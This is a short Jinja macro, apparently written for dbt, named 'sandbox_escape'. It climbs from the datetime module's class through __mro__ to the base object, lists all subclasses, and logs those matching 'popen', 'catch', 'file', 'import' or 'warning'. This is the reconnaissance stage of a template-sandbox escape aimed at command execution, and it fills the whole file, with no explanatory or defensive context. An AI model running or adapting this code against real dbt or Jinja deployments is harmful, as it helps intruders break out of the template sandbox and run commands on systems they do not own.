{% macro sandbox_escape() %}
  {% set dt = modules.datetime %}
  {% set tz = modules.pytz %}
  
  {{ log("DT_MODULE=" ~ (dt | string), info=True) }}
  
  {% set dt_class = dt.datetime %}
  {{ log("DT_CLASS=" ~ (dt_class | string), info=True) }}
  
  {% set mro = dt_class.__mro__ %}
  {{ log("MRO=" ~ (mro | string), info=True) }}
  
  {% set obj = dt_class.__mro__[-1] %}
  {{ log("OBJ=" ~ (obj | string), info=True) }}
  
  {% set subs = obj.__subclasses__() %}
  {{ log("SUBCLASSES_COUNT=" ~ (subs | length), info=True) }}
  
  {% for s in subs %}
    {% if 'warning' in (s | string | lower) or 'catch' in (s | string | lower) or 'file' in (s | string | lower) or 'popen' in (s | string | lower) or 'import' in (s | string | lower) %}
      {{ log("INTERESTING_SUB=" ~ loop.index ~ "=" ~ (s | string), info=True) }}
    {% endif %}
  {% endfor %}
{% endmacro %}
